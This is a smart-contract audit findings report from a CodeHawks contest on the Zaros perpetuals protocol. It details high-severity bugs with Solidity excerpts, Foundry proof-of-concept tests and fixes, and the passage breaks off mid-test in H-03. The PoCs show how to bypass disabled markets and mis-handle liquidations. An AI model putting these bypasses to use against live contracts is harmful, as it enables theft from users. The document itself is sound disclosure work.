# Zaros Part 1 - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Inadequate Checking of `isIncreasing` when trader adjusts position size](#H-01)
    - [H-02. Positive PnL is lost for all parties when liquidating an account, potentially causing that the MarginCollateralRecipient ends up receiving way less USD value than what it could have received.](#H-02)
    - [H-03. `SettlementBranch._fillOrder` does not guarantee the collateral of a position is enough to pay the future liquidation fee.](#H-03)
    - [H-04. Incorrect logic for checking isFillPriceValid](#H-04)
    - [H-05. Market Disruption and Financial Loss Post-Liquidation](#H-05)
    - [H-06. `LiquidationBranch::checkLiquidatableAccounts()` executes `for` loop with wrong values, causing array out of bounds to be recovered, the program will not work as expected](#H-06)
    - [H-07. Wrong parameter passed in `TradingAccount::deductAccountMargin` function that results in excess margin withdrawal](#H-07)
    - [H-08. Draining the protocol fully](#H-08)
- ## Medium Risk Findings
    - [M-01. Insufficient checks to confirm the correct status of the sequencerUptimeFeed](#M-01)
    - [M-02. A malicious User can DOS all offchain orders making them unexecutable and leaving the protocol in an insolvent state. Also all offchain Trades can also be DOSed for honest parties that do not meet the fillorder requirements (no try and catch)](#M-02)
    - [M-03. An Uninitialized Variable In The `MarketConfiguration::update` Function Causes The `PrepMarket::getIndexPrice` Function To Revert](#M-03)
    - [M-04. Incorrect liquidatable checking for market order creation](#M-04)
    - [M-05. User can withdraw all collateral when a position has enough profit so if liquidated no collateral can be deducted](#M-05)
    - [M-06. User might be unfairly liquidated after L2 Sequencer grace period](#M-06)
    - [M-07. SEV 5: The getAccountMarginRequirementUsdAndUnrealizedPnlUsd function returns incorrect margin requirement values when a position is being changed](#M-07)
    - [M-08. when fillOrder() , small pnl can cause orderFee/settlementFee to not be fully collected](#M-08)
    - [M-09. Liquidating positions of different accounts for the same market on the same block.timestamp uses the same fundingFeePerUnit regardless of the computed MarkPrice based on the size of the position been liqudiated.](#M-09)
- ## Low Risk Findings
    - [L-01. QA Report - 0xStalin - Low Severities](#L-01)
    - [L-02. Offchain orders are not cancelled after the account has been liquidated](#L-02)
    - [L-03. Functions calling `verifyReport` to verify offchain prices from chainlink will fail](#L-03)
    - [L-04. Liquidation of accounts collateral not posible because some chainlink price feed doesn't exist or are marked as medium risk by chainlink](#L-04)
    - [L-05. Attacker can abuse the system by modifying the collateral of pending orders](#L-05)
    - [L-06. Updating the maxFundingVelocity should update the funding rate as well](#L-06)
    - [L-07. Deleting CollateralTypes from the CollateralLiquidationPriority allows traders to be liquidated for free and getting back their full collateral as if they were not liquidated.](#L-07)
    - [L-08. payable Modifier in TradingAccountBranch::createTradingAccountAndMulticall ](#L-08)
    - [L-09. UpgradeBranch.sol does not use _disableInitializers()](#L-09)
    - [L-10. Trading accounts can exceed the maximum number of allowed open positions.](#L-10)
    - [L-11. Settlement fills liquidatable Market Orders](#L-11)
    - [L-12. Potential `EIP712` violation in multiple cases](#L-12)
    - [L-13. In `ChainlinkUtil::getPrice` function, skipping `roundId` check at all can be disastrous](#L-13)
    - [L-14. Funding is incorrectly updated while executing `LiquidationBranch.liquidateAccounts()` with multiple trading accounts and/or positions.](#L-14)
    - [L-15. Incorrect calculation of available margin](#L-15)
    - [L-16. Use of uninitialized variable `lastFundingTime` leads to incorrect calcualtions](#L-16)
    - [L-17. Low severity findings](#L-17)
    - [L-18. Missing expiration check in `Data Streams` report validation allows the use of expired report data](#L-18)
    - [L-19. Fees are not sent to their respective recipients when dealing with low decimals tokens](#L-19)
    - [L-20. When transfering the NFT associated to a TradingAccount, the old owner can grief the new owner by leaving an opened MarketOrder that will be executed even though the old owner is not the owner of the TradingAccount.](#L-20)
    - [L-21. The first trader in a market will have a wrong inflated fundingRate](#L-21)
    - [L-22. Users can be overcharged for orderFees](#L-22)
    - [L-23. markPrice Can Be Influenced To Cause Cascading Liquidations](#L-23)
    - [L-24. Margin Calculation In fillOrder Does Not Consider Mark Price Impact](#L-24)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: Zaros

### Dates: Jul 17th, 2024 - Jul 31st, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-07-zaros)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 8
   - Medium: 9
   - Low: 24


# High Risk Findings

## <a id='H-01'></a>H-01. Inadequate Checking of `isIncreasing` when trader adjusts position size

_Submitted by [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [sohrabhind](https://profiles.cyfrin.io/u/sohrabhind), [samuraii77](https://profiles.cyfrin.io/u/samuraii77), [tedox](https://profiles.cyfrin.io/u/tedox), [petersr](https://profiles.cyfrin.io/u/petersr), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [h2134](https://profiles.cyfrin.io/u/h2134), [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [aksoy](https://profiles.cyfrin.io/u/aksoy), [greed](https://profiles.cyfrin.io/u/greed), [meeve](https://profiles.cyfrin.io/u/meeve), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [blutorque](https://profiles.cyfrin.io/u/blutorque), [auditism](https://profiles.cyfrin.io/u/auditism), [fyamf](https://profiles.cyfrin.io/u/fyamf), [gss1](https://profiles.cyfrin.io/u/gss1), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [tricko](https://profiles.cyfrin.io/u/tricko), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [bladesec](https://profiles.cyfrin.io/u/bladesec), [kildren](https://profiles.cyfrin.io/u/kildren), [Oblivionis](https://profiles.cyfrin.io/u/Oblivionis), [izuman](https://profiles.cyfrin.io/u/izuman), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [DPS](https://codehawks.cyfrin.io/team/clw3plz710001jhoz6tkrb2lt), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [OdeWeb3](https://codehawks.cyfrin.io/team/cluqfw65k000169faytyphjol), [minhquanym](https://profiles.cyfrin.io/u/minhquanym), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [h2134](https://profiles.cyfrin.io/u/h2134)._      
            


## Summary

When a trader submits to adjust position size, protocol will check if the request is to increase position size, however, this checking is inadequate and may lead to unexpected behaviors.

## Vulnerability Details

**Firstly**, when Market or Settlement is disabled, an order cannot be created or filled if the order is to increase the position size.

```Solidity
    function createMarketOrder(CreateMarketOrderParams calldata params) external {
        ...

        // determine whether position is being increased or not
@>      ctx.isIncreasing = Position.isIncreasing(params.tradingAccountId, params.marketId, params.sizeDelta);

        // both markets and settlement can be disabled, however when this happens we want to:
        // 1) allow open positions not subject to liquidation to decrease their size or close
        // 2) prevent new positions from being opened & existing positions being increased
        //
        // the idea is to prevent a state where traders have open positions but are unable
        // to reduce size or close even though they can still be liquidated; such a state
        // would severly disadvantage traders
@>      if (ctx.isIncreasing) {
            // both checks revert if disabled
@>          globalConfiguration.checkMarketIsEnabled(params.marketId);
@>          settlementConfiguration.checkIsSettlementEnabled();
        }

        ...
    }
```

```Solidity
    function _fillOrder(
        uint128 tradingAccountId,
        uint128 marketId,
        uint128 settlementConfigurationId,
        SD59x18 sizeDeltaX18,
        UD60x18 fillPriceX18
    )
        internal
        virtual
    {
        ...

        // determine whether position is being increased or not
@>      ctx.isIncreasing = Position.isIncreasing(tradingAccountId, marketId, sizeDeltaX18.intoInt256().toInt128());


        // both markets and settlement can be disabled, however when this happens we want to:
        // 1) allow open positions not subject to liquidation to decrease their size or close
        // 2) prevent new positions from being opened & existing positions being increased
        //
        // the idea is to prevent a state where traders have open positions but are unable
        // to reduce size or close even though they can still be liquidated; such a state
        // would severly disadvantage traders
@>      if (ctx.isIncreasing) {
            // both checks revert if disabled
@>          globalConfiguration.checkMarketIsEnabled(marketId);
@>          settlementConfiguration.checkIsSettlementEnabled();
        }

        ...
    }
```

For instance, if a user opens a long position, they can creates an order to close the position, and the order will be filled. If later the user wants to open a short position, the transaction for creating the order will be reverted, nor any existing order can be filled.

However, this restriction can be easily bypassed by changing the position size in the opposite direction. Consider the following case:

1. Alice and Bob each opens a long position;
2. Owner disables Market and Settlement;
3. Alice closes her long position, then creates an order to open a short position, the transaction is reverted because the order is considered as an `increasing`;
4. Bob also wants close his long position to open a short position, instead of closing the long position, he converts the long position into a short position directly by setting a  negative `sizeDelta` to reverse the position size direction, the order is successfully created and filled, because this is not considered as an `increasing`.

The culprit is [isIncreasing()](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/leaves/Position.sol#L155-L162) in `Position` lib.

```Solidity
    function isIncreasing(
        uint128 tradingAccountId,
        uint128 marketId,
        int128 sizeDelta
    )
        internal
        view
        returns (bool)
    {
        Data storage self = Position.load(tradingAccountId, marketId);

        // If position is being opened (size is 0) or if position is being increased (sizeDelta direction is same as
        // position size)
        // For a positive position, sizeDelta should be positive to increase, and for a negative position, sizeDelta
        // should be negative to increase.
        // This also implicitly covers the case where if it's a new position (size is 0), it's considered an increase.
@>      return self.size == 0 || (self.size > 0 && sizeDelta > 0) || (self.size < 0 && sizeDelta < 0);
    }
```

This function only checks if `sizeDelta` direction is same as position size, but does not check the `self.size + sizeDelta` direction, in fact, if \``self.size + sizeDelta`\` direction is not same as position size, it should be consider as an `increasing`. For example, `self.size = 1e18` and `sizeDelta = -3e18`, new position size becomes `-2e18`, such scenario should be considered as an `increasing` because user is essentially increasing the position size in the opposite direction.

**In addtion to that**, if the trader is opening a new position or increasing the size of their existing position, protocol wants to ensure they satisfy the higher initial margin requirement:

```Solidity
    // check maintenance margin if:
    // 1) position is not increasing AND
    // 2) existing position is being decreased in size
    //
    // when a position is under the higher initial margin requirement but over the
    // lower maintenance margin requirement, we want to allow the trader to decrease
    // their losing position size before they become subject to liquidation
    //
    // but if the trader is opening a new position or increasing the size
    // of their existing position we want to ensure they satisfy the higher
    // initial margin requirement
    ctx.shouldUseMaintenanceMargin = !Position.isIncreasing(params.tradingAccountId, params.marketId, params.sizeDelta)
        && ctx.isMarketWithActivePosition;

    ctx.requiredMarginUsdX18 =
        ctx.shouldUseMaintenanceMargin ? ctx.requiredMaintenanceMarginUsdX18 : ctx.requiredInitialMarginUsdX18;
```

However, because of the Inadequate Checking of `isIncreasing`, the lower maintenance margin requirement is used, this may make them become prone  to liquidation.

Please run the following PoC in `fillMarketOrder.t.sol` to verify:

```Solidity
    function testAudit_IncreasePositionWhenMarketAndSettlementAreDisabled() public {
        uint256 depositAmount = 10_000e6;

        // Alice opens a long position
        address alice = makeAddr("Alice");
        deal(address(usdc), alice, depositAmount);

        vm.startPrank(alice);
        usdc.approve(address(perpsEngine), depositAmount);
        uint128 aliceTradingAccountId = createAccountAndDeposit(depositAmount, address(usdc));
        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: aliceTradingAccountId,
                marketId: BTC_USD_MARKET_ID,
                sizeDelta: 1e18
            })
        );
        vm.stopPrank();

        vm.startPrank(marketOrderKeepers[BTC_USD_MARKET_ID]);
        bytes memory mockSignedReport = getMockedSignedReport(BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE);
        perpsEngine.fillMarketOrder(aliceTradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);
        vm.stopPrank();

        // Bob opens a long position
        address bob = makeAddr("Bob");
        deal(address(usdc), bob, depositAmount);

        vm.startPrank(bob);
        usdc.approve(address(perpsEngine), depositAmount);
        uint128 bobTradingAccountId = createAccountAndDeposit(depositAmount, address(usdc));
        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: bobTradingAccountId,
                marketId: BTC_USD_MARKET_ID,
                sizeDelta: 1e18
            })
        );
        vm.stopPrank();

        vm.startPrank(marketOrderKeepers[BTC_USD_MARKET_ID]);
        mockSignedReport = getMockedSignedReport(BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE);
        perpsEngine.fillMarketOrder(bobTradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);
        vm.stopPrank();


        // Market and Settlement are disabled
        changePrank({ msgSender: users.owner.account });
        perpsEngine.updatePerpMarketStatus({ marketId: BTC_USD_MARKET_ID, enable: false });

        SettlementConfiguration.DataStreamsStrategy memory marketOrderConfigurationData = SettlementConfiguration
            .DataStreamsStrategy({
            chainlinkVerifier: IVerifierProxy(mockChainlinkVerifier),
            streamId: BTC_USD_STREAM_ID
        });
        SettlementConfiguration.Data memory marketOrderConfiguration = SettlementConfiguration.Data({
            strategy: SettlementConfiguration.Strategy.DATA_STREAMS_DEFAULT,
            isEnabled: false,
            fee: DEFAULT_SETTLEMENT_FEE,
            keeper: marketOrderKeepers[BTC_USD_MARKET_ID],
            data: abi.encode(marketOrderConfigurationData)
        });
        perpsEngine.updateSettlementConfiguration({
            marketId: BTC_USD_MARKET_ID,
            settlementConfigurationId: SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
            newSettlementConfiguration: marketOrderConfiguration
        });
        

        // Alice closes the long position
        vm.startPrank(alice);
        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: aliceTradingAccountId,
                marketId: BTC_USD_MARKET_ID,
                sizeDelta: -1e18
            })
        );
        vm.stopPrank();

        vm.startPrank(marketOrderKeepers[BTC_USD_MARKET_ID]);
        mockSignedReport = getMockedSignedReport(BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE);
        perpsEngine.fillMarketOrder(aliceTradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);
        vm.stopPrank();


        // Alice tries to open a short position, transaction is reveted due to that the market is disabled
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(Errors.PerpMarketDisabled.selector, BTC_USD_MARKET_ID));
        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: aliceTradingAccountId,
                marketId: BTC_USD_MARKET_ID,
                sizeDelta: -2e18
            })
        );

        
        // Bob flips the position size to open a short position
        vm.startPrank(bob);
        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: bobTradingAccountId,
                marketId: BTC_USD_MARKET_ID,
                sizeDelta: -3e18
            })
        );
        vm.stopPrank();

        // Bob's transaction successfully executed despite the market and settlement are disabled
        vm.startPrank(marketOrderKeepers[BTC_USD_MARKET_ID]);
        mockSignedReport = getMockedSignedReport(BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE);
        perpsEngine.fillMarketOrder(bobTradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);
        vm.stopPrank();
    }
```

## Impact

1. Trader can increase position size in the opposite direction despite Market and Settlement are disabled;
2. Lower maintenance margin requirement is wrongly used to check against the position's margin balance. makes trader subject to liquidation.

## Tools Used

Manual Review

## Recommendations

`isIncreasing()` should check if `self.size + sizeDelta` direction is same as position size.

```diff
    function isIncreasing(
        uint128 tradingAccountId,
        uint128 marketId,
        int128 sizeDelta
    )
        internal
        view
        returns (bool)
    {
        Data storage self = Position.load(tradingAccountId, marketId);

        // If position is being opened (size is 0) or if position is being increased (sizeDelta direction is same as
        // position size)
        // For a positive position, sizeDelta should be positive to increase, and for a negative position, sizeDelta
        // should be negative to increase.
        // This also implicitly covers the case where if it's a new position (size is 0), it's considered an increase.
-       return self.size == 0 || (self.size > 0 && sizeDelta > 0) || (self.size < 0 && sizeDelta < 0);
+       return self.size == 0 || (self.size > 0 && (sizeDelta > 0 || self.size + sizeDelta < 0)) || (self.size < 0 && (sizeDelta < 0 || self.size + sizeDelta > 0));
    }
```

## <a id='H-02'></a>H-02. Positive PnL is lost for all parties when liquidating an account, potentially causing that the MarginCollateralRecipient ends up receiving way less USD value than what it could have received.

_Submitted by [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [0xstalin](https://profiles.cyfrin.io/u/0xstalin)._      
            


````markdown
## Summary
When liquidating an account, if the account has positive PnL, that amount of PnL is not minted to the account because all of its positions will be closed, so, such positive PnL will be lost to the TradingAccount, but, that PnL will also be lost to the MarginCollateralRecipient.

## Vulnerability Details
Let's break into two the explanation of this bug, first, let's explore what should happen when an account has a positive PnL, and then, we'll explore how margin is deducted from the account's collateralBalance.

So, [when an account has positive PnL, the TradingAccount receives a deposit equivalent amount of USDZ into his collateralMarginBalance to the amount of positive PnL, and, the PerpetualEngine contract gets minted the exact same amount that was deposited into the TradingAccount](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L481-L491), in this way, the deposited USDZ is indeed backed by the underlying token.

Now, when the margin is deducted from an account, the [`TradingAccount.deductAccountMargin() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L488-L578) iterates over the collateralLiquidationPriority attempting to deduct/seize collateral from the TradingAccount, and such collateral is transferred to a specific recipient depending if its deducting settlementFee, orderFee or PnL. The key to understanding here is that this amount comes out of the TradingAccount collateralBalance.

For example, if there is an account that has 100 USD in WETH, and, 50 USD in USDC as collateral, and, is required to deduct 125 USD from this account, the deductMargin will take 125 USD worth of the collateral owned by the account. In the end, the account will have 25 leftover USD in collateral, wether in WETH or USDC, what matters is that the account will have 25 USD as leftover, meaning, the account had enough collateral to cover the required amount to be deducted.

The problem caused by not minting the positive PnL to the liquidated accounts is that the PnL (when positive) is considered as if the account would have that USD value as deposited collateral in its account, but, **when a position is liquidated and its positive PnL is not minted to the account, the margin that can be deducted would be at most the value of the account's collateral, which, as we'll see in the below examples, it could be lower than the amount to be deducted.**

Consider an account that has multiple positions that are profitable and has yielded 300 positive PnL. Now, let's make an example of when the value of the collateral backing this account goes down and the account falls into liquidation.

Even though the loanToValue of the account's collateral is way lower than the requiredMaring, the huge positive PnL prevents the account from being liquidated because the marginBalance, after adding the positive PnL to the collateral's loanToValue is > requiredMargin.
- Account is not liquidable because the big positive PnL prevented the account marginBalance to be lower than the requiredMargin.
```
requiredMarging:  1000
PnL:              300

marginBalance:    750 + 300 ===> 1050

loanToValue:      750
RealMarketValue:  1000
```

Now, let's see what happens when the value of the collateral drops a little bit more.
- Account is now liquidable. But, the account only has collateral worth 900 USD, which means, the most amount of collateral (without the PnL) that will be transferred to the respective recipients will be 900USD, even though the amount to deduct is 1000.
  - This means that **the positive PnL that was generated while the position was opened is completely lost, and the liquidator's recipients receive way less USD (900 USD) than what they should have received (1000 USD)**
```
requiredMarging:  1000
PnL:              300

marginBalance:    675 + 300 ===> 975

loanToValue:      675
RealMarketValue:  900
```

As we've seen, the liquidator's recipient received way less USD value than what they should have, and not even mention that the liquidated account lost an extra 300 USD because all the deducted USD was from its deposited collateral, regardless that the account generated a profit of 300 USD. The account in reality had a total market value of 1200 USD, (900 USD worth of its collateral, and 300 USD of positive PnL), and, in the end, the account got deducted all of its collateral (900 USD), and did not receive any of its positive PnL (300 USD).

As we can see in the below snippet, the [`LiquidationBranch.liquidateAccounts() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/LiquidationBranch.sol#L105-L222) does not mint the positive PnL before deducting collateral from the account.
```
function liquidateAccounts(uint128[] calldata accountsIds) external {
    ...

    for (uint256 i; i < accountsIds.length; i++) {
        ...

        // get account's required maintenance margin & unrealized PNL
        (, UD60x18 requiredMaintenanceMarginUsdX18, SD59x18 accountTotalUnrealizedPnlUsdX18) =
            tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);

        // get then save margin balance into working data
        ctx.marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18);

        // if account is not liquidatable, skip to next account
        // account is liquidatable if requiredMaintenanceMarginUsdX18 > ctx.marginBalanceUsdX18
        if (!TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, ctx.marginBalanceUsdX18)) {
            continue;
        }

        //@audit-issue => Positive PnL has not been minted to the account, and the liquidation execution directly proceeds to deduct margin from the account's collateral.

        // deduct maintenance margin from the account's collateral
        // settlementFee = liquidationFee
        ctx.liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
            feeRecipients: FeeRecipients.Data({
                marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
                orderFeeRecipient: address(0),
                settlementFeeRecipient: globalConfiguration.liquidationFeeRecipient
            }),
            pnlUsdX18: requiredMaintenanceMarginUsdX18,
            orderFeeUsdX18: UD60x18_ZERO,
            settlementFeeUsdX18: ctx.liquidationFeeUsdX18
        });

        ...
    }
}
```

## Impact
Positive PnL on liquidated accounts is completely lost. Accounts will get deducted more than what they should, and the liquidator's recipient would end up receiving way less USD than what they should.

## Tools Used
Manual Audit.

## Recommendations
Similar to [`SettlementBranch._fillOrder() function`, before deducting margin, verify if there is a positive PnL, if so, deposit that amount of PnL into the TradingAccount, and mint USDZ to the PerpetualEngine contract.](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L481-L491)
- In this way, when the liquidation execution reaches the point of deducting margin, the account will already have the positive PnL on its collateralBalance in the form of USDZ.
  - This will allow the deduct margin function to deduct that USDZ from the account and transfer it to the liquidator's recipient.
  - This also ensures that the liquidated account gets deducted the exact amount that should be deducted, because now, that positive PnL is also part of the account's collateralBalance.

```
function liquidateAccounts(uint128[] calldata accountsIds) external {
    ...

    for (uint256 i; i < accountsIds.length; i++) {
        ...

        // get account's required maintenance margin & unrealized PNL
            (, UD60x18 requiredMaintenanceMarginUsdX18, SD59x18 accountTotalUnrealizedPnlUsdX18) =
                tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);

        ...                

        // if account is not liquidatable, skip to next account
        // account is liquidatable if requiredMaintenanceMarginUsdX18 > ctx.marginBalanceUsdX18
        if (!TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, ctx.marginBalanceUsdX18)) {
            continue;
        }

        //@audit => Verify if the account has positive PnL, if so, mint it to the account before proceeding to deduct margin from the account
        if (accountTotalUnrealizedPnlUsdX18.gt(SD59x18_ZERO)) {
            // fetch storage slot for global config
            GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();
            address usdzToken = globalConfiguration.usdToken;

            uint256 marginToAddX18 = accountTotalUnrealizedPnlUsdX18.intoUD60x18();
            tradingAccount.deposit(usdzToken, marginToAddX18);

            LimitedMintingERC20(usdzToken).mint(address(this), marginToAddX18.intoUint256());
        }

        // deduct maintenance margin from the account's collateral
        // settlementFee = liquidationFee
        ctx.liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
            feeRecipients: FeeRecipients.Data({
                marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
                orderFeeRecipient: address(0),
                settlementFeeRecipient: globalConfiguration.liquidationFeeRecipient
            }),
            pnlUsdX18: requiredMaintenanceMarginUsdX18,
            orderFeeUsdX18: UD60x18_ZERO,
            settlementFeeUsdX18: ctx.liquidationFeeUsdX18
        });

        ...
    }
}

```
````

## <a id='H-03'></a>H-03. `SettlementBranch._fillOrder` does not guarantee the collateral of a position is enough to pay the future liquidation fee.

_Submitted by [petersr](https://profiles.cyfrin.io/u/petersr), [Cryptor](https://profiles.cyfrin.io/u/Cryptor), [bigsam](https://profiles.cyfrin.io/u/bigsam), [qpzm](https://profiles.cyfrin.io/u/qpzm), [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [0xmuxyz](https://profiles.cyfrin.io/u/0xmuxyz), [sohrabhind](https://profiles.cyfrin.io/u/sohrabhind), [cybrid](https://profiles.cyfrin.io/u/cybrid), [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [DPS](https://codehawks.cyfrin.io/team/clw3plz710001jhoz6tkrb2lt), [0x00a](https://profiles.cyfrin.io/u/0x00a), [tutkata](https://profiles.cyfrin.io/u/tutkata), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [tezeoffor](https://profiles.cyfrin.io/u/tezeoffor), [AllTooWell](https://codehawks.cyfrin.io/team/clvmefpm30001oev62qxtl4zt). Selected submission by: [qpzm](https://profiles.cyfrin.io/u/qpzm)._      
            


## Summary
`SettlementBranch._fillOrder` does not guarantee the collateral of a position is enough to pay the future liquidation
fee.

## Vulnerability Details
`SettlementBranch._fillOrder` does not check the collateral of a position is enough to pay the future liquidation
fee after paying the fee for opening a position.

## POC
1. Add this file to `test/integration/perpetuals/settlement-branch/fillMarketOrder/fillMarketOrderPOC.t.sol`.
2. Run `forge test --mt test_POC_fillMarketOrder`.
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.25;

// Zaros dependencies
import { PremiumReport } from "@zaros/external/chainlink/interfaces/IStreamsLookupCompatible.sol";
import { IVerifierProxy } from "@zaros/external/chainlink/interfaces/IVerifierProxy.sol";
import { Errors } from "@zaros/utils/Errors.sol";
import { OrderBranch } from "@zaros/perpetuals/branches/OrderBranch.sol";
import { MarketOrder } from "@zaros/perpetuals/leaves/MarketOrder.sol";
import { SettlementBranch } from "@zaros/perpetuals/branches/SettlementBranch.sol";
import { PerpMarket } from "@zaros/perpetuals/leaves/PerpMarket.sol";
import { Position } from "@zaros/perpetuals/leaves/Position.sol";
import { SettlementConfiguration } from "@zaros/perpetuals/leaves/SettlementConfiguration.sol";
import { Base_Test } from "test/Base.t.sol";
import { TradingAccountHarness } from "test/harnesses/perpetuals/leaves/TradingAccountHarness.sol";
import { GlobalConfigurationHarness } from "test/harnesses/perpetuals/leaves/GlobalConfigurationHarness.sol";
import { PerpMarketHarness } from "test/harnesses/perpetuals/leaves/PerpMarketHarness.sol";
import { PositionHarness } from "test/harnesses/perpetuals/leaves/PositionHarness.sol";

// PRB Math dependencies
import { UD60x18, ud60x18 } from "@prb-math/UD60x18.sol";
import { SD59x18, sd59x18, unary } from "@prb-math/SD59x18.sol";

contract FillMarketOrder_Integration_POC_Test is Base_Test {
    function setUp() public override {
        Base_Test.setUp();
        changePrank({ msgSender: users.owner.account });
        configureSystemParameters();
        createPerpMarkets();
        changePrank({ msgSender: users.naruto.account });
    }

    struct Test_GivenTheMarginBalanceUsdIsOverTheMaintenanceMarginUsdRequired_Context {
        uint256 marketId;
        uint256 marginValueUsd;
        uint256 expectedLastFundingTime;
        uint256 expectedOpenInterest;
        int256 expectedSkew;
        int256 firstOrderExpectedPnl;
        SD59x18 secondOrderExpectedPnlX18;
        int256 expectedLastFundingRate;
        int256 expectedLastFundingFeePerUnit;
        uint128 tradingAccountId;
        int128 firstOrderSizeDelta;
        int128 secondOrderSizeDelta;
        bytes firstMockSignedReport;
        bytes secondMockSignedReport;
        UD60x18 openInterestX18;
        UD60x18 firstOrderFeeUsdX18;
        UD60x18 secondOrderFeeUsdX18;
        UD60x18 firstFillPriceX18;
        UD60x18 secondFillPriceX18;
        SD59x18 skewX18;
        MarketConfig fuzzMarketConfig;
        PerpMarket.Data perpMarketData;
        MarketOrder.Data marketOrder;
        Position.Data expectedPosition;
        Position.Data position;
        address marketOrderKeeper;
    }

    function test_POC_fillMarketOrder() external {
        Test_GivenTheMarginBalanceUsdIsOverTheMaintenanceMarginUsdRequired_Context memory ctx;

        ctx.marketId = BTC_USD_MARKET_ID;
        // @audit
        //  requiredMarginUsdX18: 1000000000050000000
        //  marginBalanceUsdX18: 3080000000054000000
        //  totalFeesUsdX18: 2080000000004000000
        ctx.marginValueUsd = 3080000000054000000;

        deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });

        // Config first fill order

        ctx.fuzzMarketConfig = getFuzzMarketConfig(ctx.marketId);

        ctx.marketOrderKeeper = marketOrderKeepers[ctx.fuzzMarketConfig.marketId];

        ctx.tradingAccountId = createAccountAndDeposit(ctx.marginValueUsd, address(usdz));

        // MOCK_BTC_USD_PRICE: $100_000
        ctx.firstOrderSizeDelta = 0.001e18; // BTC_USD_MIN_TRADE_SIZE

        (,,, ctx.firstOrderFeeUsdX18,,) = perpsEngine.simulateTrade(
            ctx.tradingAccountId,
            ctx.fuzzMarketConfig.marketId,
            SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
            ctx.firstOrderSizeDelta
        );

        ctx.firstFillPriceX18 = perpsEngine.getMarkPrice(
            ctx.fuzzMarketConfig.marketId, ctx.fuzzMarketConfig.mockUsdPrice, ctx.firstOrderSizeDelta
        );

        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: ctx.tradingAccountId,
                marketId: ctx.fuzzMarketConfig.marketId,
                sizeDelta: ctx.firstOrderSizeDelta
            })
        );

        ctx.firstOrderExpectedPnl = int256(0);

        ctx.firstMockSignedReport =
            getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);

        changePrank({ msgSender: ctx.marketOrderKeeper });

        // it should transfer the pnl and fees
        // margin value: $4
        // settlementFee: $2
        // orderFee: $0.080000000004
        expectCallToTransfer(usdz, feeRecipients.settlementFeeRecipient, DEFAULT_SETTLEMENT_FEE);
        expectCallToTransfer(usdz, feeRecipients.orderFeeRecipient, ctx.firstOrderFeeUsdX18.intoUint256());

        perpsEngine.fillMarketOrder(ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport);
        Position.State memory positionState = perpsEngine.getPositionState(
